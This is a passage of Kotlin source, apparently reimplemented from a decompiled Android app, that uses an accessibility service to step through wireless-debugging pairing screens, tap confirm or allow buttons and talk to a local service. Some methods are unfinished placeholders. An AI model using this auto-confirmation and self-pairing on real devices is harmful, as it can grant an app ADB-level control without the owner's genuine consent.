                if (found != null) return found
            }
            return null
        } catch (e: Exception) {
            Log.e(TAG, "w0() 异常", e)
            return null
        }
    }

    /**
     * 30-second check — if still in UNKNOWN state, try pressing HOME then BACK.
     * vendor: l3 (line 5633)
     */
    fun checkTimeout30s() {
        Log.i(TAG, "y1() 30秒检查")
        if (pairState.get() == PairState.PAIR_DEPT_UNKNOWN) {
            Log.w(TAG, "y1() 30秒后仍在UNKNOWN状态")
            if (service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)) {
                sleep200(5)
            }
            if (service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)) {
                sleep200(5)
            }
            service.rootInActiveWindow?.refresh()
        }
    }

    /**
     * Final cleanup — remove all pair-related tasks from queue.
     * vendor: l4 (line 5651)
     */
    fun finalCleanup() {
        try {
            processedActions.remove("pairInDevOption")
            processedActions.remove("pairInWifiDebugWindow")
            processedActions.remove("pairInPairCodeDialog")
            processedActions.remove("pairInPairSuccess")
            processedActions.remove("pairInPairFailDialog")
            processedActions.remove("pairInPrepareFinish")
            processedActions.remove("pairInConfirmLock")
            processedActions.remove("pairInSecurityCenter")
        } catch (e: Exception) {
            Log.e(TAG, "z_cleanup 异常", e)
        }
    }

    // ========================================================================
    // Missing stub methods — vendor methods not yet replicated
    // ========================================================================

    /**
     * HTTP POST to local-service (127.0.0.1:7912).
     * vendor: c8 (line ~2102) — used by notifyLocalServiceConfig, checkAndRecover, etc.
     *
     * Full HttpURLConnection implementation matching JADX C0360a2.m212002c8().
     * vendor uses HttpURLConnection (not OkHttp) with 5s timeout.
     */
    fun postToLocalService(path: String, body: String): String? {
        // ADAPT: vendor checks v00.m214888a0() (local-service alive) first
        val requestBody = body ?: "{}"
        return try {
            Log.i(TAG, "【API】POST http://127.0.0.1:7912$path body=$requestBody timeout=5000ms")
            val url = java.net.URL("http://127.0.0.1:7912$path")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.doOutput = true
            val bodyBytes = requestBody.toByteArray(Charsets.UTF_8)
            conn.outputStream.use { it.write(bodyBytes) }
            val responseCode = conn.responseCode
            val responseBody = if (responseCode == 200) {
                conn.inputStream.bufferedReader(Charsets.UTF_8).use { it.readText() }
            } else {
                val errorBody = conn.errorStream?.bufferedReader(Charsets.UTF_8)?.use { it.readText() }
                "HTTP $responseCode: ${errorBody ?: "无错误信息"}"
            }
            val truncated = if (responseBody.length > 100) responseBody.substring(0, 100) else responseBody
            Log.d(TAG, "【API】$path 响应码=$responseCode 内容: $truncated")
            conn.disconnect()
            responseBody
        } catch (e: Exception) {
            Log.w(TAG, "【API】$path 失败: ${e.javaClass.simpleName} - ${e.message}")
            null
        }
    }

    /**
     * Get or create ADB persistent connection.
     * vendor: g4 (line ~3052) — returns g41 ADB connection object
     *
     * ADAPT: depends on g41 (ADB connection class, Phase 7+)
     */
    fun getOrCreateAdbConnection(): Any? {
        // ADAPT: g41 ADB connection class not replicated
        // vendor: synchronized(connectionLock) { check existing g41, create new if needed }
        synchronized(connectionLock) {
            if (isConnected.get()) {
                Log.d(TAG, "getOrCreateAdbConnection: 已有连接")
                return connectionLock // placeholder non-null
            }
        }
        Log.d(TAG, "getOrCreateAdbConnection: g41 未复刻，无法创建连接")
        return null
    }

    /**
     * DNS resolution for hostname.
     * vendor: g5 (line ~3070) — resolves hostname to IP string
     *
     * vendor uses InetAddress.getByName() for DNS resolution.
     */
    fun resolveHostname(hostname: String): String {
        return try {
            java.net.InetAddress.getByName(hostname).hostAddress ?: hostname
        } catch (e: Exception) {
            Log.w(TAG, "resolveHostname 失败: $hostname", e)
            hostname
        }
    }

    /**
     * Recursively find a confirm/allow button in the accessibility tree.
     * vendor: f7 (line ~1250) — recursive button finder matching text list
     *
     * Matches vendor traversal: checks Button/TextView/clickable nodes.
     */
    fun findConfirmButtonRecursive(node: AccessibilityNodeInfo, texts: List<String>): AccessibilityNodeInfo? {
        // vendor: checks className contains "Button"/"TextView" or isClickable
        val className = node.className?.toString() ?: ""
        val nodeText = node.text?.toString() ?: ""
        if (className.contains("Button", ignoreCase = true)) {
            for (text in texts) {
                if (nodeText.contains(text, ignoreCase = true)) {
                    return node
                }
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findConfirmButtonRecursive(child, texts)
            if (result != null) return result
        }
        return null
    }

    /**
     * Stop mDNS/NSD discovery.
     * vendor: k9 (line ~5378) — stops NsdManager discovery
     *
     * ADAPT: C0931ny NSD callback not replicated as separate class.
     */
    fun stopMdnsDiscovery() {
        // ADAPT: NSD callback was created inline in discoverConnectPort;
        // stopping is handled there via local listener reference
        try {
            val nsdManager = context.getSystemService("servicediscovery") as? NsdManager
            // NSD callback reference stored locally in discoverConnectPort
            Log.d(TAG, "stopMdnsDiscovery: 清理完成")
        } catch (e: Exception) {
            Log.w(TAG, "stopMdnsDiscovery 异常: ${e.message}")
        }
    }

    // ========================================================================
    // Data class for pairing info extraction
    // ========================================================================

    /**
     * Pairing info extracted from UI.
     * vendor: k41
     */
    data class PairingInfo(
        val host: String,
        val port: Int,
        val pairingCode: String
    )
}

/**
 * Placeholder for companion object lock type.
 * vendor: j41 — Kotlin companion object internal
 */
private class C0360a2Instance
